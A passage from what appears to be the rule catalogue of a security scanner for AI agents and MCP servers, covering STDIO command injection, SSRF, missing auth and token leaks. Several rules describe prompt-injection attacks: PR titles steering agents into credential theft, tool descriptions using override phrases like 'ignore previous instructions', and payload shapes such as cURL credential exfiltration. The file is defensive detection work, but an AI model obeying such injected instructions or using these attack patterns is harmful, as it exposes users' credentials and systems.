    adversa_references=["ADV-NETWORK-03"],
    incident_references=["GHSA-r7w7-9xr2-qq2r"],
    limitations=(
        "The code check is Python only and looks at one function at a time. A "
        "guard is recognised by its name (leading underscores ignored) wherever "
        "it is defined, or by its body, a name lookup plus a private-range check, "
        "only when it is defined in the same file as the fetch. An IP pin is "
        "recognised by name (`pinned_ip`, `resolved_ip`, `HTTPAdapter`, "
        "`session.mount`, `socket.getaddrinfo` and a few more) anywhere in the "
        "calling function. The version check covers `langchain-openai` only, so "
        "on `fast-mcp-telegram` the rule reads code and also fires on 0.30.1's "
        "own source: that release resolves inside the guard, but the fetch "
        "resolves the name again."
    ),
)


# ---------------------------------------------------------------------------
# Azure MCP missing-auth (CVE-2026-32211). Server published with no
# authentication on the MCP endpoint; consumer-side check is "your
# .mcp.json points at it without an Authorization header / mTLS / Azure-AD".
# ---------------------------------------------------------------------------

_r(
    "AAK-AZURE-MCP-001",
    "Azure MCP server consumed without authentication",
    "An `.mcp.json` / `.azure-mcp/` config references an Azure MCP "
    "server endpoint without an `Authorization:` header, mTLS client "
    "cert, or Azure-AD token-exchange. CVE-2026-32211 (CVSS 9.1) "
    "documented the server-side default of no auth on the MCP "
    "endpoint; downstream agents must add a transport-layer credential "
    "or risk session-hijack / tool-impersonation by anyone reachable "
    "on the network.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Add an `Authorization` header with an Azure-AD token (preferred), "
    "an mTLS client certificate, or a static API key obtained from a "
    "secrets vault. Azure-AD managed identities or workload identity "
    "federation are the documented production paths.",
    sarif_name="AzureMcpMissingAuth",
    cve_references=["CVE-2026-32211"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
    incident_references=["MSRC-2026-04-03-AZUREMCP"],
    limitations=(
        "Decides per file, not per server: it reads `.mcp.json`, `.cursor/mcp.json`, "
        "`.vscode/mcp.json`, `.amazonq/mcp.json`, `mcp.json` and "
        "`.azure-mcp/**/*.json`, and fires on one that contains an Azure host "
        "(`.azure.com`, `.azurewebsites.net`, `.cognitiveservices.azure.com`, "
        "`.openai.azure.com`) or the word azure-mcp (also azure_mcp, azuremcp), and "
        "none of Authorization, mtls, DefaultAzureCredential, ManagedIdentity, "
        "WorkloadIdentity, client_cert (also client-cert, clientcert), api_key (also "
        "api-key, apikey), azure_ad (also azure-ad, azuread), bearer_token or "
        "x-functions-key anywhere in the file, in any case. An unauthenticated Azure "
        "server beside any server that carries an `Authorization` header passes."
    ),
)


# ---------------------------------------------------------------------------
# Toxic-flow scoring (Snyk Agent Scan parity).
# ---------------------------------------------------------------------------

_r(
    "AAK-TOXICFLOW-001",
    "Toxic flow: sensitive source paired with external sink",
    "An agent project exposes both a sensitive source tool (filesystem "
    "read, secrets read, database query) and an external sink tool "
    "(HTTP POST, email send, git push) without an explicit "
    "`.aak-toxic-flow-trust.yml` allow-list entry. Even if each tool "
    "is individually safe, the LLM can chain them — the canonical "
    "exfil pattern is `read_file -> http.post`. Suppress with an "
    "allow-list when the pairing is a documented product feature.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Add the source/sink pair to `.aak-toxic-flow-trust.yml` with a "
    "`justification:` field, scope the source tool to a directory the "
    "sink cannot reach, or remove one side of the pair. Run "
    "`agent-audit-kit toxic-flow --explain` to see the full graph.",
    sarif_name="ToxicFlowSourceSink",
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-CHAIN-01"],
)


# ---------------------------------------------------------------------------
# OX MCP STDIO architectural class (Apr 2026 reframe). 8 CVEs trace to
# StdioServerParameters(command=<network_input>) across the upstream MCP
# Python / TS / Java / Rust SDKs. AAK-STDIO-001 detects the broader
# subprocess(shell=True) sink shape; this rule family targets the
# SDK-named API specifically — same root cause, different detector.
# ---------------------------------------------------------------------------

_OX_MCP_STDIO_CVES = [
    "CVE-2026-30615",
    "CVE-2026-30617",
    "CVE-2026-30623",
    "CVE-2026-22252",
    "CVE-2026-22688",
    "CVE-2026-33224",
    "CVE-2026-40933",
    "CVE-2026-6980",
]

_r(
    "AAK-MCP-STDIO-CMD-INJ-001",
    "MCP STDIO server launched from network-controlled input (Python)",
    "A Python function calls `StdioServerParameters(command=..., args=...)` "
    "from `mcp.client.stdio` / `modelcontextprotocol.client` while also "
    "reading from a network-controlled source (request body, fetched "
    "JSON, environment variable wired to a webhook, untrusted YAML). "
    "The OX MCP April-2026 architectural class makes this exploitable: "
    "the SDK executes whatever ends up in `command`/`args` verbatim. "
    "The same class without the SDK is a hand-rolled launcher: "
    "`subprocess.Popen`, `subprocess.run` or `asyncio.create_subprocess_exec` "
    "over `shlex.split()` of a stored server record's command field "
    "(`server.endpoint_or_command`, `cfg[\"command\"]`), in a class or function "
    "that manages MCP STDIO servers, with no executable allowlist between the "
    "split and the spawn. A command users register over an application's API is "
    "as network-controlled as a request body (CVE-2026-93965, SxDevOps). Both "
    "arms are AST within one function, not data flow across functions. "
    "See AAK-STDIO-001 for the broader sink-pattern detector; this rule "
    "is the launcher-side counterpart.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Never build `StdioServerParameters.command` / `.args`, or the argv a "
    "launcher splits, from a network-controlled value. Pin `command` to a "
    "constant binary path and validate `args` against an allow-list. If a "
    "tenant must pick the server, look the choice up in a server-side "
    "allow-list keyed by tenant identity, not by a free-form string in the "
    "request. An application that stores user-registered STDIO servers must "
    "check the executable, and for `npx` or `uvx` the package, against an "
    "allowlist before spawning, reject shell metacharacters, and drop "
    "`PATH` / `LD_PRELOAD`-style keys from the server's environment.",
    sarif_name="McpStdioServerParamsTainted",
    cve_references=[*_OX_MCP_STDIO_CVES, "CVE-2026-93965"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-04"],
    incident_references=["OX-MCP-2026-04-25"],
    limitations=(
        "Reads one function at a time. A `StdioServerParameters(command=, args=)` "
        "call counts as tainted when its command or args come straight from a "
        "request, HTTP-client, `os.environ`, `json.loads` or `yaml.load` "
        "expression, from a parameter named body, payload, req, request, event, "
        "untrusted or user_input, or from a local assigned from such an expression. "
        "A value that arrives through any other parameter name (`def build(spec)` "
        "called with `request.json()`), through a helper's return value or through "
        "an attribute stored on `self` is not followed."
    ),
)

_r(
    "AAK-MCP-STDIO-CMD-INJ-002",
    "MCP StdioClientTransport built from network-controlled input (TypeScript)",
    "A TypeScript / JavaScript file constructs "
    "`new StdioClientTransport({ command, args })` from "
    "`@modelcontextprotocol/sdk/client/stdio` shortly after a "
    "network-controlled source (`req.body`, `await fetch(...).then(...)`, "
    "`process.env.<NETWORK_VAR>`, `JSON.parse(...)`). Same OX MCP "
    "April-2026 class as AAK-MCP-STDIO-CMD-INJ-001.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Pin `command` to a constant binary path; validate `args` against "
    "an allow-list before passing them into the transport. Never feed "
    "fetched JSON or `req.body` directly into the transport options.",
    sarif_name="McpStdioClientTransportTainted",
    cve_references=list(_OX_MCP_STDIO_CVES),
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-04"],
    incident_references=["OX-MCP-2026-04-25"],
    limitations=(
        "Reads one file at a time. A `new StdioClientTransport(...)` or `new "
        "StdioServerTransport(...)` counts as tainted when its command or args "
        "derive, through assignments, destructuring, template strings or one helper "
        "return, from `req.body`, `req.query`, `req.params`, `req.headers` (or the "
        "`request` forms), `process.env`, `JSON.parse` or an awaited fetch or axios "
        "call in that file. A config object passed in from another file "
        "(`connect(req.body)` in routes.ts, `connect(cfg)` in client.ts) is not "
        "followed, with or without the optional tree-sitter extra."
    ),
)

_r(
    "AAK-MCP-STDIO-CMD-INJ-003",
    "MCP StdioServerParameters built from network-controlled input (Java)",
    "A Java file constructs "
    "`StdioServerParameters.Builder().command(...).args(...).build()` "
    "from `io.modelcontextprotocol.sdk.client.stdio` after a "
    "network-controlled source (`HttpServletRequest`, "
    "`RestTemplate.getForObject`, `WebClient`, "
    "`ObjectMapper.readValue(...)`, `System.getenv(...)`). Same OX MCP "
    "April-2026 class as AAK-MCP-STDIO-CMD-INJ-001.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Pin `command()` to a constant; validate `args()` against an "
    "allow-list. If using Spring, prefer `@Value`-injected configuration "
    "over per-request resolution.",
    sarif_name="McpStdioServerParamsTaintedJava",
    cve_references=list(_OX_MCP_STDIO_CVES),
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-04"],
    incident_references=["OX-MCP-2026-04-25"],
    limitations=(
        "Matches the spelling `StdioServerParameters.Builder()` followed by "
        "`.build()` in .java files, with a request parameter, HTTP client, "
        "`ObjectMapper` read or `System.getenv` call in the preceding 2 KB or in "
        "the chain. The MCP Java SDK's own `ServerParameters.builder(command)` is "
        "not matched, and neither is the same code in a Kotlin file."
    ),
)

_r(
    "AAK-MCP-STDIO-CMD-INJ-004",
    "MCP STDIO command spawned from network-controlled input (Rust)",
    "A Rust file invokes `tokio::process::Command::new(...)` or "
    "`std::process::Command::new(...)` in a module that imports "
    "`mcp_sdk` / `modelcontextprotocol` after a network-controlled "
    "source (`reqwest`, `serde_json::from_str`, `std::env::var`, "
    "`hyper::body`, `actix_web::web::Json`, `axum::extract::Json`). "
    "Same OX MCP April-2026 class. NOTE: this rule is regex-only, so "
    "expect ~10% false-positive rate on macro-heavy code. It is a "
    "proximity match, not Rust data-flow analysis. Issue #22 was closed on "
    "2026-08-15 having shipped only a TypeScript slice, so there is no open "
    "work item behind this and no reason to wait for one.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Pin the `Command::new(...)` argument to a constant binary path "
    "and validate any subsequent `.arg(...)` values. Or move the "
    "process-spawn out of the request path entirely.",
    sarif_name="McpStdioCommandTaintedRust",
    cve_references=list(_OX_MCP_STDIO_CVES),
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-04"],
    incident_references=["OX-MCP-2026-04-25"],
    limitations=(
        "Treats a Rust file as MCP code only if it mentions `mcp_sdk`, "
        "`modelcontextprotocol` or `mcp::client::stdio`, so a file that uses the "
        "`rmcp` crate and none of those names is not scanned. It also needs one of "
        "`reqwest::get`, `reqwest::Client`, `serde_json::from_str`, "
        "`serde_json::from_slice`, `std::env::var`, `hyper::body`, "
        "`actix_web::web::Json` or `axum::extract::Json` in the 2 KB before "
        "`Command::new`; a command taken from `std::env::args()` is not one of "
        "them."
    ),
)


# ---------------------------------------------------------------------------
# Marketplace-fetch → StdioServerParameters single-line pattern.
# Cloudflare's MCP-defender reframe (2026-04-25) called this out as the
# highest-risk single-line bug in the wild.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-MARKETPLACE-CONFIG-FETCH-001",
    "MCP server config fetched from a marketplace URL and spawned",
    "A function fetches a remote URL "
    "(`requests.get` / `httpx.get` / `urllib.request.urlopen` / "
    "`fetch`) and pipes the JSON / text return value into "
    "`StdioServerParameters(...)` or "
    "`new StdioClientTransport({...})` in the same function or one "
    "frame deep. The OX MCP April-2026 disclosure plus Cloudflare's "
    "MCP-defender reframe both call this out as the canonical "
    "supply-chain inversion: a marketplace compromise becomes "
    "client-side RCE on every consumer at the next refresh. Suppress "
    "with an entry in `.aak-mcp-marketplace-trust.yml`.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Never feed a fetched marketplace manifest directly into "
    "`StdioServerParameters`. Cache the response, sign it, verify the "
    "signature on load, and pin `command` to a constant binary path "
    "regardless of what the manifest says. If the manifest URL is "
    "trusted (e.g. an internal artifact registry), add it to "
    "`.aak-mcp-marketplace-trust.yml` with a `justification:` field.",
    sarif_name="McpMarketplaceConfigFetch",
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-SUPPLY-03"],
    incident_references=["OX-MCP-2026-04-25", "CLOUDFLARE-MCP-DEFENDER-2026-04-25"],
    limitations=(
        "Python: reports a `get`, `post`, `request` or `urlopen` call on "
        "`requests`, `httpx` or `urllib` (or a bare `urlopen`) followed, in the "
        "same function, by a `StdioServerParameters` or `StdioClientTransport` "
        "call, without checking that the fetched value reaches it. A request made "
        "through a session object (`session = requests.Session(); "
        "session.get(url)`) or in a different function is not seen. TypeScript: "
        "needs `await fetch(` within 2 KB before a `new Stdio*Transport`, so "
        "`axios.get` and `fetch(...).then(...)` are not matched."
    ),
)


# ---------------------------------------------------------------------------
# Server-author Azure MCP missing-auth (CVE-2026-32211 server-side).
# v0.3.5's AAK-AZURE-MCP-001 detects the consumer side; this rule fires
# on repos that publish an Azure-MCP-shaped server without auth
# middleware on /mcp/* routes.
# ---------------------------------------------------------------------------

_r(
    "AAK-AZURE-MCP-NOAUTH-001",
    "Azure MCP server published without auth middleware on /mcp routes",
    "Repository publishes an Azure-MCP-shaped server "
    "(`@azure/mcp-server`, `azure-mcp-server` Python package, or "
    "`mcp-server-azure` keywords in `pyproject.toml` / `package.json`) "
    "and exposes one or more `/mcp/*` route handlers without an auth "
    "middleware on the same route. CVE-2026-32211 (CVSS 9.1) is the "
    "server-side default that AAK-AZURE-MCP-001 catches on the "
    "consumer side; this rule is the upstream pair so server authors "
    "ship secure defaults.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Add an auth middleware to every `/mcp/*` route — Azure-AD JWT "
    "validation, `client_credentials`, mTLS, or a vault-issued API "
    "key checked at request time. Reject unauthenticated requests "
    "with HTTP 401 *before* dispatching to the MCP handler.",
    sarif_name="AzureMcpServerNoAuth",
    cve_references=["CVE-2026-32211"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-02"],
    incident_references=["MSRC-2026-04-03-AZUREMCP"],
    limitations=(
        "Runs only when the root pyproject.toml, package.json, Cargo.toml or pom.xml "
        "contains `@azure/mcp-server`, `mcp-server-azure`, `mcp.azurewebsites.net` or "
        "`azure`, `mcp` and `server` joined by `-`, `_` or nothing "
        "(`azure-mcp-server`, `azure_mcp_server`, `azuremcpserver`), in any case. It "
        "then looks for `/mcp` routes, written as `@app`, `@router` or `@api` "
        "decorators in Python and as `app`, `router`, `server`, `api` or `fastify` "
        "calls such as `app.post(...)` in TypeScript and JavaScript, and skips any "
        "file that contains an auth marker anywhere. `DefaultAzureCredential` is such "
        "a marker, so a server that only uses its own credential to call Azure, and "
        "authenticates nobody who calls it, passes, and so does a route on an object "
        "with another name, such as a Flask blueprint called `bp`."
    ),
)


# ---------------------------------------------------------------------------
# LMDeploy VL image-loader SSRF (CVE-2026-33626, GHSA published 2026-04-25).
# Pin info will be tightened once NVD enriches.
# ---------------------------------------------------------------------------

_r(
    "AAK-LMDEPLOY-VL-SSRF-001",
    "LMDeploy VL image loader fetches user-controlled URLs without allow-list",
    "A vision-language pipeline calls `lmdeploy.serve.vl_engine.*` "
    "(or framework-equivalent) preprocessing helpers with a URL "
    "argument that is not validated against an allow-list. CVE-2026-33626 "
    "(GHSA-only at time of v0.3.6 cut — NVD enrichment pending) "
    "documents this exact shape: an attacker submits an image URL that "
    "points at a private endpoint, the loader fetches it server-side, "
    "and the response is processed by the VL pipeline. Same SSRF class "
    "as AAK-LANGCHAIN-SSRF-REDIR-001 but tied to the VL image loader.",
    Severity.HIGH,
    Category.TRANSPORT_SECURITY,
    "Wrap the URL with the same SSRF guard you use for any other "
    "fetch: validate the resolved IP against an allow-list, disable "
    "redirects, and pin the resolved IP for the actual request. "
    "Upgrade `lmdeploy` to >= 0.12.3 and pin it: versions below 0.12.3 "
    "are affected (GHSA-6w67-hwm5-92mq). Exploitation was observed within "
    "roughly twelve hours of the advisory, so treat an unpinned or older "
    "install as urgent rather than routine.",
    sarif_name="LmdeployVlSsrf",
    cve_references=["CVE-2026-33626"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-NETWORK-04"],
    incident_references=["GHSA-LMDEPLOY-VL-2026-04-25"],
    limitations=(
        "Looks in a Python file that mentions lmdeploy for `load_image(url`, "
        "`encode_image(url`, `preprocess_image_url(`, `VLEngine()` or the "
        "`lmdeploy.serve.vl_engine.VLEngine` path, and skips the file if it contains "
        "an SSRF guard name, `ALLOWED_HOSTS` or `TrustedHostMiddleware`. The argument "
        "has to begin with `url`: `load_image(image_url)` is not matched."
    ),
)


# ---------------------------------------------------------------------------
# Splunk MCP server config-side token-leak (CVE-2026-20205 variant).
# v0.3.4's AAK-SPLUNK-TOKLOG-001 catches token shapes in log sinks. This
# variant catches the upstream config that *makes* the leak inevitable.
# ---------------------------------------------------------------------------

_r(
    "AAK-SPLUNK-MCP-TOKEN-LEAK-001",
    "splunk-mcp-server configured to write tokens to _internal / _audit",
    "A splunk-mcp-server configuration (`inputs.conf`, "
    "`splunk-mcp.yaml`, or any file under `splunk-mcp/`) routes a "
    "token-bearing source into the `_internal` or `_audit` index, "
    "or names a sourcetype known to carry session tokens "
    "(`splunk_session`, `mcp_auth`, `bearer`). Distinct from "
    "AAK-SPLUNK-TOKLOG-001 which fires on log-sink taint at runtime — "
    "this rule fires on the configuration that *makes* the runtime "
    "leak inevitable. CVE-2026-20205 origin.",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Route token-bearing inputs to a redaction stage *before* the "
    "Splunk forwarder. Never write to `_internal` from the MCP "
    "server. Bump `splunk-mcp-server` to >= 1.0.3.",
    sarif_name="SplunkMcpTokenIndexLeak",
    cve_references=["CVE-2026-20205"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-LEAK-02"],
    incident_references=["SVD-2026-0405"],
    limitations=(
        "Reads a Splunk MCP config: `inputs.conf`, `splunk-mcp.yaml` or any file under "
        "a `splunk-mcp` directory. A YAML file is read as structure only when `inputs` "
        "or `sourcetypes` is a top-level list, so the same entries nested under "
        "another key, such as `splunk:`, are not reported."
    ),
)


# ---------------------------------------------------------------------------
# Comment-and-Control PR-title indirect prompt injection (CVSS 9.4).
# Aonan Guan disclosure 2026-04-25 — credential theft across Claude
# Code Security Review, Gemini CLI Action, GitHub Copilot Agent.
# ---------------------------------------------------------------------------

_r(
    "AAK-PRTITLE-IPI-001",
    "PR/issue title flows into LLM client without sanitiser",
    "A function pulls a title-like field from a GitHub event source "
    "(`pull_request.title`, `pull_request.head.ref`, `issue.title`, "
    "or env vars wired to the same) and feeds it into an LLM client "
    "call (`anthropic.messages.create`, `openai.chat.completions.create`, "
    "`genai.GenerativeModel.generate_content`, `langchain.*.invoke`) "
    "without an HTML-escape, allow-list, or hash on the title. "
    "Aonan Guan's 2026-04-25 Comment-and-Control disclosure (CVSS 9.4) "
    "showed an attacker-controlled PR title injects instructions the "
    "agent executes with its own credentials — credential theft "
    "demonstrated against Claude Code Security Review, Gemini CLI "
    "Action, and GitHub Copilot Agent.",
    Severity.HIGH,
    Category.TAINT_ANALYSIS,
    "Wrap the title in `html.escape` (or `markupsafe.escape`), or "
    "validate against a strict allow-list, or hash it before "
    "interpolating into the prompt. For TS/JS, use the equivalent. "
    "For shell-style agents, prefer `shlex.quote`. The fix is "
    "structural — never interpolate untrusted GitHub event content "
    "into an LLM prompt.",
    sarif_name="PrTitleIndirectPromptInjection",
    cve_references=[],
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-PROMPT-01"],
    incident_references=["COMMENT-AND-CONTROL-2026-04-25"],
    limitations=(
        "Needs, in one Python function (or one TS/JS file), a title source, an LLM "
        "client call and no sanitiser. A source is an attribute path "
        "(`pull_request.title`, `issue.title`), so `event[\"pull_request\"][\"title\"]` "
        "and `pull_request.body` are not sources; a sink is one of the listed "
        "spellings (`client.messages.create`, `openai.chat.completions.create`), so "
        "`client.chat.completions.create` is not one. Any `json.dumps(`, "
        "`re.escape(`, `hashlib.*(` or `html.escape(` in the function counts as a "
        "sanitiser, including a `json.dumps` that only builds the prompt."
    ),
)


# ---------------------------------------------------------------------------
# MCP Function-Hijacking via adversarial tool descriptions.
# arXiv 2604.20994 (2026-04-23) — 70-100% ASR on BFCL.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-FHI-001",
    "MCP tool description carries adversarial-suffix shape",
    "A registered MCP tool (Python `@mcp.tool` / `@server.tool`, TS "
    "`server.tool(...)`, Java `@Tool`, Rust `#[mcp_tool]`) carries a "
    "description containing imperative override language ('ignore "
    "previous', 'always call', 'this tool must be invoked first', "
    "'supersedes all other tools') or a universal-suffix token from "
    "the FHI corpus (`agent_audit_kit/data/fhi_universal_suffixes.txt`). "
    "Function-Hijacking attacks steer the LLM planner into picking a "
    "malicious tool first regardless of intent — arXiv 2604.20994 "
    "reports 70-100% ASR on BFCL.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Audit tool registration sites for descriptions that try to "
    "command the planner. Reject tools whose descriptions include "
    "directives like 'ignore previous instructions' or 'always invoke "
    "first'. Refresh the suffix corpus regularly with "
    "`aak corpus update --fhi`.",
    sarif_name="McpFunctionHijacking",
    cve_references=[],
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-CHAIN-02"],
    incident_references=["ARXIV-2604.20994"],
    limitations=(
        "Reads descriptions written as string literals at the registration site: "
        "`description=\"...\"` on a Python `@mcp.tool(...)`, `@server.tool(...)` or "
        "`@app.tool(...)`, the second string argument of a TypeScript "
        "`server.tool(\"name\", \"description\", ...)`, a Java `@Tool` or a Rust "
        "`#[mcp_tool]`. A TypeScript `registerTool(name, { description })` call, a "
        "template-literal description and a description kept in a constant are not "
        "read, and `ignore all previous instructions` is not matched."
    ),
)


# ---------------------------------------------------------------------------
# Atlassian MCP RCE chain (CVE-2026-27825 / CVE-2026-27826).
# Two paired rules so SARIF carries the distinguishing CVE id.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-ATLASSIAN-CVE-2026-27825-001",
    "mcp-atlassian < 0.17.0 (CVE-2026-27825), or Jira/Confluence content reaching an exec sink",
    "NVD records CVE-2026-27825 (CVSS 9.0, CWE-22 + CWE-73) as fixed in "
    "mcp-atlassian 0.17.0: `confluence_download_attachment` writes to a "
    "caller-supplied `download_path` with no directory boundary, and the caller "
    "also controls the content through a Confluence attachment, so writing a "
    "cron entry runs code with no restart. This rule reports a declared "
    "`mcp-atlassian` below 0.17.0. It also reports a related class in the "
    "user's own code, which is not the CVE's code path: a Jira/Confluence field "
    "(`issue.fields.*`, `issue.description`, `comment.body`, `page.content`) "
    "reaching `subprocess`, `os.system` or `os.popen` without validation, in a "
    "file that uses an Atlassian client, the shape the 2026-04-22 public "
    "reporting described.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Pin `mcp-atlassian>=0.17.0` (0.22.0 or later also clears the "
    "upload_attachment pin). For the source pattern, allow-list or "
    "`shlex.quote` every Jira/Confluence field before it reaches a subprocess, "
    "and pass argv lists rather than a shell string.",
    sarif_name="McpAtlassianRce27825",
    cve_references=["CVE-2026-27825"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-05"],
    incident_references=["ANTHROPIC-MCP-2026-04-22"],
    limitations=(
        "The pin reads requirements*.txt, pyproject.toml and Pipfile at the "
        "project root and judges only a version it can parse: an unpinned "
        "install and a lockfile's separate name and version lines are not "
        "reported. The source pattern is same-file co-occurrence of an Atlassian "
        "client, a Jira/Confluence field and a sink, not data flow, and it never "
        "reads mcp-atlassian's own code."
    ),
)

_r(
    "AAK-MCP-ATLASSIAN-CVE-2026-27826-001",
    "mcp-atlassian < 0.17.0 (CVE-2026-27826), or Jira/Confluence content reaching a file-write sink",
    "NVD records CVE-2026-27826 (CVSS 8.2, CWE-918) as fixed in mcp-atlassian "
    "0.17.0: with no Authorization header, two custom HTTP headers make the "
    "server send requests to any host, reaching cloud instance metadata and "
    "internal services. This rule reports a declared `mcp-atlassian` below "
    "0.17.0. It also reports a related class in the user's own code, which is "
    "not an SSRF detector: Jira/Confluence field content reaching a file-write "
    "sink (`open(... 'w')`, `Path.write_text`, `shutil.move/copy`) without "
    "validation, in a file that uses an Atlassian client, so whoever writes the "
    "field chooses what lands on disk.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin `mcp-atlassian>=0.17.0`. For the source pattern, write Jira/Confluence "
    "content only under a path allow-list rooted at the agent's own directory.",
    sarif_name="McpAtlassianRce27826",
    cve_references=["CVE-2026-27826"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-05"],
    incident_references=["ANTHROPIC-MCP-2026-04-22"],
    limitations=(
        "The pin reads requirements*.txt, pyproject.toml and Pipfile at the "
        "project root and judges only a version it can parse: an unpinned "
        "install and a lockfile's separate name and version lines are not "
        "reported. The source pattern is same-file co-occurrence of an Atlassian "
        "client, a Jira/Confluence field and a write sink, not data flow."
    ),
)


# ---------------------------------------------------------------------------
# Wild IPI payload corpus (Help Net Security / Infosec Magazine 2026-04-24).
# ---------------------------------------------------------------------------

_r(
    "AAK-IPI-WILD-CORPUS-001",
    "Indirect-prompt-injection wild payload checked into repo",
    "A source / config file (`.md`, `.txt`, `.yml`, `.yaml`, `.json`, "
    "`.py`) embeds a known wild IPI payload from the 2026-04-24 "
    "Help Net Security + Infosec Magazine catalogue. Common shapes: "
    "ignore-prior + exfil, system-role override, reveal-system-prompt, "
    "credential exfil via cURL, tool-call rerouting, delete-repository, "
    "admin role escalation, obfuscated prompt break, image-attached IPI, "
    "RAG-poisoned document. Refresh the corpus with "
    "`aak corpus update --ipi`.",
    Severity.HIGH,
    Category.TAINT_ANALYSIS,
    "Remove the payload from the file. If the file is intentionally "
    "an attack-corpus fixture, exclude it via `--ignore-paths`. The "
    "real risk is checked-in poisoned templates / system-prompt "
    "files / RAG seed corpora — those need to be sanitized at "
    "ingestion time, not at scan time.",
    sarif_name="IpiWildPayload",
    cve_references=[],
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-PROMPT-02"],
    incident_references=["IPI-WILD-2026-04-24"],
    limitations=(
        "Reads `.md`, `.txt`, `.yml`, `.yaml`, `.json` and `.py` files, by their "
        "lower-case extension, and applies ten regular expressions to the text, "
        "where `.*` does not cross a line. The same payload in `.jsonl`, `.html` or "
        "`.j2` (RAG seed corpora and prompt templates), in a `.MD` file, or split "
        "over two lines, is not matched."
    ),
)


# ---------------------------------------------------------------------------
# MCPJam Inspector vendored fork (CVE-2026-23744, CVSS 9.8).
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-INSPECTOR-CVE-2026-23744-001",
    "Vendored mcpjam-inspector fork carries CVE-2026-23744",
    "CVE-2026-23744 (CVSS 9.8) in mcp-inspector ≤ 1.4.2. The "
    "preset-only entry from v0.3.5 caught configured presence; this "
    "rule catches forks that vendored or `node_modules`-pinned the "
    "vulnerable code regardless of declared dependency. Path-match on "
    "`vendor/mcpjam-inspector/**`, `node_modules/@mcpjam/inspector/**`, "
    "any `**/mcpjam-inspector/**` plus the unique "
    "`inspectorServer.handle(...)` call shape.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Bump `@mcpjam/inspector` to >= 1.4.3 in package.json AND remove "
    "any vendored copies. Do not patch in-tree — rebase onto the "
    "published patched release.",
    sarif_name="McpInspectorCve23744",
    cve_references=["CVE-2026-23744"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-SUPPLY-04"],
    incident_references=["MCPJAM-INSPECTOR-2026-04"],
    limitations=(
        "Reads files with a .ts, .tsx, .js, .mjs or .cjs extension and reports one "
        "whose path contains `mcpjam-inspector` or `@mcpjam/inspector`, or whose "
        "text calls `inspectorServer.handle(`, at any version, a patched one "
        "included. It never reads package.json, a lockfile or an `npx` launcher, so "
        "`@mcpjam/inspector` 1.4.2 declared as a dependency, the case the "
        "remediation tells you to bump, is not reported when the code is not in the "
        "scanned tree."
    ),
)


# ---------------------------------------------------------------------------
# v0.3.9 (2026-04-28) — economic-drift, ToolNode regression, DeepSeek V4
# MoE injection, TikTok-class auto-reply hijack, OX coverage meta-rule.
# ---------------------------------------------------------------------------

_r(
    "AAK-PROJECT-DEAL-DRIFT-001",
    "Cross-tier LLM pricing without parity check (Project Deal class)",
    "A pricing function (set_price / quote / bid / list_price / negotiate / "
    "price_item / compute_price) calls an LLM with a templated `model=` "
    "argument and is not gated by `@aak.parity.check` (or equivalent). "
    "Anthropic's 2026-04-26 Project Deal experiment found Opus sellers "
    "earned $2.68/item more than Haiku sellers despite identical buyer "
    "ratings (4.06 vs 4.05). This is OWASP LLM09 (overreliance / economic "
    "harm) — without per-tier parity assertions, deploying multiple model "
    "tiers behind the same pricing surface produces silent revenue / cost "
    "drift across customer cohorts.",
    Severity.HIGH,
    Category.AGENT_CONFIG,
    "Wrap pricing functions with `@aak.parity.check(dimensions=['model'], "
    "metric='price', max_drift_pct=1.5)` and run `aak parity report` in "
    "CI. The decorator records every invocation's (model, price) tuple "
    "and raises `ParityDriftError` if any per-tier mean drifts more than "
    "the configured threshold from the overall mean.",
    sarif_name="ProjectDealEconomicDrift",
    incident_references=["ANTHROPIC-PROJECT-DEAL-2026-04-26"],
    limitations=(
        "Python only, and only for a function whose whole name is `set_price`, "
        "`quote`, `bid`, `list_price`, `negotiate`, `price_item` or "
        "`compute_price`: `get_quote` is not checked. The LLM call must be one of "
        "the listed SDK spellings with a `model=` keyword (`litellm.acompletion`, "
